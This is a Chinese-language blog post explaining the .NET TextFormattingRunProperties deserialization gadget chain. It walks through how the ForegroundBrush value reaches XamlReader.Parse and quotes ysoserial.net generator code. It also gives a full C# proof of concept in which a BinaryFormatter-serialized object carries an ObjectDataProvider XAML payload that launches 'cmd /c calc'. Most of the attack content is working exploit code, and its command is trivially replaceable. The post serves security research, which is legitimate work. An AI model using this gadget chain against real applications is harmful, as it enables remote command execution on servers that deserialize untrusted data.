---
title: TextFormattingRunProperties 利用链 - nice_0e3
url: https://www.cnblogs.com/nice0e3/p/16945401.html
source: 博客园 - nice_0e3
date: 2022-12-03
fetch_date: 2025-10-04T00:24:23.379739
---

# TextFormattingRunProperties 利用链 - nice_0e3

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/nice0e3/)

# [nice\_0e3](https://www.cnblogs.com/nice0e3)

## 理想与热爱

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/nice0e3/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/nice_0e3)
* 订阅
* [管理](https://i.cnblogs.com/)

# [TextFormattingRunProperties 利用链](https://www.cnblogs.com/nice0e3/p/16945401.html "发布于 2022-12-02 19:07")

### 分析

反序列化时会自动调用与GetObjectData函数同样参数的构造函数。所以会走到这里。

![img](https://img2023.cnblogs.com/blog/1993669/202212/1993669-20221202190929161-166145884.png)

TextFormattingRunProperties实现ISerializable接口，在其序列化的构造函数中，进行`this.GetObjectFromSerializationInfo("ForegroundBrush", info)`

![img](https://img2023.cnblogs.com/blog/1993669/202212/1993669-20221202190936334-1892372719.png)

`GetObjectFromSerializationInfo`会从info里面获取`ForegroundBrush`的值，然后

调用`XamlReader.Parse(payload)`解析获取到的值。

使用`XamlReader.Parse(payload)`结合前面的ObjectDataProvider的xaml\_payload串联进行买了执行。可以来看看yso里面是怎么生存ObjectDataProvider的payload的

```
        public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
        {
            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
            string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();

            if (inputArgs.Minify)
            {
                xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
            }

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return payload;
        }
    }
}

//生成
public override object Generate(string formatter, InputArgs inputArgs)
        {
            // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
            if (formatter.ToLower().Equals("xaml"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();

                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }

                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload = "";

                if (variant_number == 2)
                {
                    ResourceDictionary myResourceDictionary = new ResourceDictionary();
                    myResourceDictionary.Add("", odp);
                    // XAML serializer can also be exploited!
                    payload = SerializersHelper.Xaml_serialize(myResourceDictionary);

                }
```

将构造的恶意的`ObjectDataProvider`类实例化对象添加到ResourceDictionary对象中然后进行`System.Windows.Markup.XamlWriter.Save`进行序列化。

最终的payload

```
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.VisualStudio.Text.Formatting;
namespace BinaryFormatterSerialize
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            //string xaml_payload = File.ReadAllText(@"C:\Users\sangfor\Desktop\ysoserial.net-master\ysoserial.net-master\TestConsoleApp\1.xml");

            string payloadxml = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<ObjectDataProvider MethodName=\"Start\" IsInitialLoadEnabled=\"False\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:sd=\"clr-namespace:System.Diagnostics;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\">\r\n  <ObjectDataProvider.ObjectInstance>\r\n    <sd:Process>\r\n      <sd:Process.StartInfo>\r\n        <sd:ProcessStartInfo Arguments=\"/c calc\" StandardErrorEncoding=\"{x:Null}\" StandardOutputEncoding=\"{x:Null}\" UserName=\"\" Password=\"{x:Null}\" Domain=\"\" LoadUserProfile=\"False\" FileName=\"cmd\" />\r\n      </sd:Process.StartInfo>\r\n    </sd:Process>\r\n  </ObjectDataProvider.ObjectInstance>\r\n</ObjectDataProvider>";

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(payloadxml);
            MemoryStream memoryStream = new MemoryStream();
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.Serialize(memoryStream, payload);
            memoryStream.Position = 0;
            binaryFormatter.Deserialize(memoryStream);

            Console.ReadKey();
        }
    }
}
```

整体流程如下：

序列化：自己编写个类继承ISerializable，重写`GetObjectData`方法，给`ForegroundBrush`字段赋值为xaml的payload，并且将对象类型赋值为`TextFormattingRunProperties`类

反序列化：在反序列化时触发反序列化构造函数`GetObjectFromSerializationInfo`-> 获取设置的ForegroundBrush的值，调用`XamlReader.Parse(payload)`进行命令执行

### 参考

<https://www.freebuf.com/articles/network/351317.html>

<https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md>

posted @
2022-12-02 19:07
[nice\_0e3](https://www.cnblogs.com/nice0e3)
阅读(655)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025

[![](//assets.cnblogs.com/images/ghs.png)浙公网安备 33010602011771号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771)
[浙ICP备2021040463号-3](https://beian.miit.gov.cn)